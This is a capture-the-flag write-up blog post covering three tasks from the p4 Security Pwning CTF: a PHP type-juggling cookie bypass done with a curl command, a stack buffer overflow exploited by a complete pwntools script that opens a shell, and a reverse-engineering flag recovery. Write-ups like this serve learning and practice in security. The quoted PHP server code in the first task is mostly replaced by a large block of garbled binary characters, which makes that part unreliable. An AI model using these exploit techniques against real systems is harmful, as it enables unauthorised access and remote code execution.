---
title: "Security Pwning CTF by p4 - cont"
date: 2016-11-27T08:39:57.000Z
tags:
  - "ctf"
feature_image: "content/images/2016/11/score_board.webp"
---

# Security Pwning CTF by p4 - cont

In the last post I've promised that I need to look a bit more into the Security Pwning CTF, here are a few more solutions to CTF by p4.

## web 100 - Bulletproof Login Server™

In this task we are give a part of the server code and a login panel that located under <https://monk.pwning2016.p4.team/login.php>
[code]
    ');

        if (isset($_COOKIE['remember_me'])) {
            echo('
[code]
    '.htmlentities(var_ex�
    �z��٥o��������Bo�>�P{w`^��X�1L�YYO��Z�)M�>��*����z�r4��9�����z0���m��ܵ������Z�
    -0�5(��o���i���p#74�pKLʒ�fj�J�b���AqF�];3y�-R�����;�x�H�HpQ�`d�ڧ��
    q�@C�����8
    �*��R�P<���X���E>Y@_(�;0�߷��}��#�H#�H��h�e]Њ��m��=r�K�i)�Ǝ�Ϡ�^J���c�7�c갚Q��Z�<�m�M��-&UwZ;��I�K
    T���;�f��9d��iFuo0���l��$�Q{�w>s��i�~�`����	Di+�\�}y"��vq���7]����F���+'7�i��&?��l���Ȑ��+���%���[�/�gnh�¸G�Ǆ�����.�d�PD��{�����y>�В�H"u�,|;1ן�*�A����d#�&S;%�4��ς�)�hL,�-d��n��4���b�9�;��q�/�g�D�N~�����}u�Q-G��Me���*eܙ@?(�e��G��bA��^ �ʅ��6,G-x���Ia��ɩv3]�{��*�P&ڐ��;E�2?f�9�'�ҩ�+��u���A�P�'���QEH��OJ����3�Vk�
    �
    qoIq�{���Du1��eZ)�w��P:h������@�J+�����Be��+�\����vy���d� T�Jş=X]N�U��������Ed���a����~�<@\���V�e�Y��ޕN-�-�o��͕�Q$�(�
    Rb���"�"+��>�����������<��ZYC�+�#*��x�氹:M��W��LY8c�vgˑ�"��`�E[R���x�����s�(��͈qV2�ۤ�p�t�K�7GMT%>���/�l^�,�P���@�:���T�>r�w>	�����N~!�b��� �݋}��9̷
    o���󮶭�3�J�s
    1��NcE�=���#�I_��T�F
    ;񢢤��-	m���U�՛�[D
    �w����{a�{x��tb,G�����~Pj��Jt`�S��%>l�����%������Q��J��"&Y;<�8NB����R�%����{������+��^��C����M������ )�Z�\;��4��;[��r�b�+�
    �X}H+8�b)���X��*��m�0�!�+����9cBJ�oW����,�}���VJ{�c����_c��v��-/USo���pQ��X��aj�l4脷�*�P��)ƹq(o*�dfR��Bv���z��@�6ܾ?��l��ZtۊǿG��I��o#�����QDY8�Wԗ��8�>:��yr��5Y�;�JɎ�T������3���fdAI�3n7���vԽ�ꓠg��I^#�ޘ}��iP�=j����n��W�[�Z���[v�T1q[�DS^�l�Y�C���\���C�LF��r80�?�N9_�Bz��.o�)
    �MP�4@���-J�/T�����������ýv�fJ<�jg ���3���z.v�d��ğ�[P��g!2ͤ�yQ3���������C������,x��pͫc~���
    �k���Bc��0����`���զ5C��l����.*�(���opGAB���m��<��Pl�ie�E�Q�b����ZGɒ�-��w�Oq�W��������y�M�N�CfB������e"�<(X�m�i@j%^��<$C��V4�! _}�����R����!mz]!��9������s�9߰,�}��8٣�!�����p�X�����4�5�p��|m�Z��}*�H�Vh��V
[/code]

by examine the code we can see that data that's being passed from a cookie is deserialized and is loosely compared with admin or demo user data. I think we can trick it to let us through. Let's use `curl` here.

`curl -v https://monk.pwning2016.p4.team/admin.php -b 'remember_me={"login":"admin", "token":0}'`

so we are passing some data in the cookie (`-b`) and the name will be `remember_me` and as the login we pass "admin" and as the token we are passing 0 as int. Since the loose comparison in PHP there will be a conversion of whatever is passed from `getAuthToken` to float and probably the conversion will fail (I assume the `getAuthToken` returns some kind of hash) and the `==` will evaluate to true and we will gain the access.

When we run our command we can see the flag in the output:

`pwn{unserialize.happens.to.be.ivul}`

## pwn 150 - Nawias musi się zgadzać

In this task we are given the [file](https://pwning2016.p4.team/downloads/pwn150.zip) and an address at which this program can be accessed `nc pwning2016.p4.team 1337`.

We load this program into r2.

![](content/images/2016/11/Zrzut-ekranu-2016-11-26-o-17.04.07.webp)

main is quit simple. Let's analyze `check_my_brackets`

It is a bit more complex but the most important bits are at the beginning

![](content/images/2016/11/Zrzut-ekranu-2016-11-26-o-17.05.25.webp)

Here

![](content/images/2016/11/Zrzut-ekranu-2016-11-26-o-17.06.29.webp)

and here

![](content/images/2016/11/Zrzut-ekranu-2016-11-26-o-17.06.44.webp)

Also by closer inspection of methods in the code we see this `shell_me` function.

![](content/images/2016/11/Zrzut-ekranu-2016-11-26-o-17.10.36.webp)

So to sum up:

  * there's a char buffer on stack and there's no check for valid range
  * the method check brackets and in case of "correct" expression being passed returns from it
  * in case of invalid one, text is printed inside and a call to `exit` is made

So if we want to exploit the buffer and run `shell_me` function we need to provide a "correct" expression

Ok. Time to for some python. For pwning we will use [pwntools](https://github.com/Gallopsled/pwntools). A library that makes exploitation easy. The nice feature is that you can easily switch from attacking a ELF file on your local machine to targeting over a socket.

But before that we need our payload:
`payload = ''.join("()"*62)+struct.pack("I",0x0)+"AAAAAAAA"+struct.pack("Q",0x00000000004005f6)`

What we are sending here? First the brackets - we fill he buffer. Next is the counter - we set it to zero so that we do not influence the counting mechanism. Then few chars and at the end we send the address of the return method. After that we call `interactive()` and if everything works we get the shell.

The full script
[code]
    #!/usr/bin/python

    from pwn import *
    import struct

    payload = ''.join("()"*62)

    def go(is_remote):
            global HOST
            global PORT
            if is_remote:
                    s = remote(HOST, PORT)
            else:
                    context.binary = ELF('./brackets')
                    s = process(context.binary.path)

            global payload

            payload = payload + struct.pack("I",0x0)+"AAAAAAAA"+struct.pack("Q",0x00000000004005f6)

            s.sendline(payload)

            s.interactive()

            s.close()

    HOST = 'pwning2016.p4.team'
    PORT = 1337
    go(True)
[/code]

![](content/images/2016/11/Zrzut-ekranu-2016-11-26-o-18.13.54.webp)

`pwn{b1n4ry_expl01t1ng}`

## re 100 - Rex

In this task we are again given with the binary that we load to IDA (free).

We quickly locate the 'check password' code and obtain the information that expected password is 26 characters long (`flag_len`)

![](content/images/2016/11/Zrzut-ekranu-2016-11-15-o-23.19.41.webp)

The main part of flag check is here:

![](content/images/2016/11/Zrzut-ekranu-2016-11-27-o-09.21.39.webp)

and here

![](content/images/2016/11/Zrzut-ekranu-2016-11-27-o-09.22.54.webp)

If we go into the `do_more_with_char` method we can see that it's generates some kind of values from which later we take the value at index of the input char and later we compare it with correct encoded flag:

`0x7e 0xe9 0xf3 0x71 0x80 ...`

We know that the flag should start with `pwn{` so we input it as a flag and in fact we get few first values to be `0x73 0xe9 pxf3 0x71`. What about the next ones?

We'll use `gdb`. Let's put a breakpoint on the line:

![](content/images/2016/11/Zrzut-ekranu-2016-11-27-o-09.32.34.webp)

then we search for the searched value in the memory

![](content/images/2016/11/Zrzut-ekranu-2016-11-27-o-09.35.16.webp)

and calculate the offset and the password char.

![](content/images/2016/11/Zrzut-ekranu-2016-11-27-o-09.36.29.webp)

in this case `r`. By doing this process few ;) more times (I guess it could be somehow automated?) we extract the whole flag.

Flag: `pwn{rc4_j3st_dl4_b13dnych}`

Ok so next 3 tasks from Security Pwning CTF done. What's left is crypto. I'll deal with them in the last post.
